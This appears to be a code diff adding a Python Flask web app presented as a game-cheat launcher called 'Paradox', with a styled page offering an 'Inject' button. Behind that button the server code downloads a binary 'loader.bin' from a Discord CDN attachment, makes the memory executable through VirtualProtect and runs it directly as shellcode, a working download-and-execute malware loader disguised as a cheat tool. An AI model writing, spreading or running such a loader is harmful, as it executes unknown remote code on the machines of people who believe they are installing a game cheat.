@@ -1,0 +1,302 @@
+from flask import Flask, render_template_string, request, jsonify
+import threading
+import logging
+import sys
+import ctypes
+import requests
+
+
+cli = sys.modules['flask.cli']
+cli.show_server_banner = lambda *x: None
+logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+app = Flask(__name__)
+
+
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paradox</title>
+    <style>
+        :root {
+            --primary: #0a2e5a;       /* Very dark blue */
+            --secondary: #0d3b6b;     /* Slightly lighter dark blue */
+            --accent: #114b8a;        /* Dark blue accent */
+            --dark: #000000;          /* Pure black */
+            --darker: #0a0a0a;        /* Slightly lighter black */
+            --light: #e0e0e0;         /* Light text */
+            --success: #1b5e20;       /* Dark green */
+            --danger: #b71c1c;       /* Dark red */
+            --select-bg: #0a1a30;     /* Dark blue for select */
+            --button-hover: #0d3b6b;  /* Dark blue for button hover */
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background-color: rgba(10, 20, 30, 0.95);
+            padding: 2rem;
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            animation: fadeIn 0.5s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, 
+                var(--primary), 
+                var(--secondary), 
+                var(--accent));
+            z-index: -1;
+            border-radius: 1rem;
+            opacity: 0.5;
+            animation: borderPulse 4s linear infinite;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes borderPulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 0.3; }
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+            font-size: 1.8rem;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 8px rgba(10, 46, 90, 0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid rgba(13, 59, 107, 0.5);
+            background-color: var(--select-bg);
+            color: var(--light);
+            font-size: 1rem;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%230d3b6b'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 1.5rem;
+            transition: all 0.3s ease;
+        }
+        
+        select:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px var(--accent);
+            background-color: var(--select-bg);
+            border-color: var(--accent);
+        }
+        
+        select option {
+            background-color: var(--select-bg);
+            color: var(--light);
+            padding: 10px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            border-radius: 0.5rem;
+            border: none;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(10, 46, 90, 0.4);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(10, 46, 90, 0.6);
+            background: linear-gradient(135deg, var(--secondary), var(--button-hover));
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .status {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 0.5rem;
+            text-align: center;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .status.show {
+            opacity: 1;
+        }
+        
+        .success {
+            background-color: rgba(27, 94, 32, 0.2);
+            color: #66bb6a;
+            border: 1px solid rgba(27, 94, 32, 0.3);
+        }
+        
+        .error {
+            background-color: rgba(183, 28, 28, 0.2);
+            color: #ef5350;
+            border: 1px solid rgba(183, 28, 28, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Paradox</h1>
+        <form action="/select" method="post" id="cheatForm">
+            <div class="form-group">
+                <select name="cheat" required>
+                    <option value="" disabled selected>Select an action...</option>
+                    <option value="inject">Inject</option>
+                </select>
+            </div>
+            <button type="submit">Execute</button>
+        </form>
+        <div class="status" id="statusMessage"></div>
+    </div>
+
+    <script>
+        document.getElementById('cheatForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const form = e.target;
+            const status = document.getElementById('statusMessage');
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                status.textContent = data.message;
+                status.className = data.status === 'success' 
+                    ? 'status success show' 
+                    : 'status error show';
+                
+                setTimeout(() => {
+                    status.className = 'status';
+                }, 3000);
+            })
+            .catch(error => {
+                status.textContent = 'Error executing action: ' + error.message;
+                status.className = 'status error show';
+                setTimeout(() => {
+                    status.className = 'status';
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/select', methods=['POST'])
+def select_cheat():
+    cheat = request.form.get('cheat')
+    if cheat == "inject":
+        try:
+            url = "https://cdn.discordapp.com/attachments/1262916245435711650/1360419301160521748/loader.bin?ex=67fb0cb4&is=67f9bb34&hm=e93e73e518584c28cb4d3e739fbf5b692ec655a360fabee9ba883133e6041f25&"
+            response = requests.get(url, timeout=10)
+            response.raise_for_status() 
+            shellcode = response.content
+
+            shellcode_size = len(shellcode)
+            memory = ctypes.create_string_buffer(shellcode, shellcode_size)
+
+            PAGE_EXECUTE_READWRITE = 0x40
+            old_protect = ctypes.c_ulong()
+            ctypes.windll.kernel32.VirtualProtect(
+                memory,
+                shellcode_size,
+                PAGE_EXECUTE_READWRITE,
+                ctypes.byref(old_protect)
+            )
+
+            func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(memory))
+
+            func()
+            
+            return jsonify({'status': 'success', 'message': 'Injection successful'})
+            
+        except requests.exceptions.RequestException as e:
+            print(f"Network error: {e}")
+            return jsonify({'status': 'error', 'message': 'Failed to download shellcode'}), 500
+        except Exception as e:
+            print(f"Injection error: {e}")
+            return jsonify({'status': 'error', 'message': f'Injection failed: {str(e)}'}), 500
+    
+    return jsonify({'status': 'error', 'message': 'Invalid action'}), 400
+
+def run_server():
+    app.run(host='192.168.1.4', port=1234, debug=False, use_reloader=False)
+
+if __name__ == '__main__':
+    server_thread = threading.Thread(target=run_server)
+    server_thread.daemon = True
+    server_thread.start()
+    
+    print("Open http://192.168.1.4:1234 in your browser")
+    try:
+        while True:
+            pass
+    except KeyboardInterrupt:
+        print("\nServer stopped.")
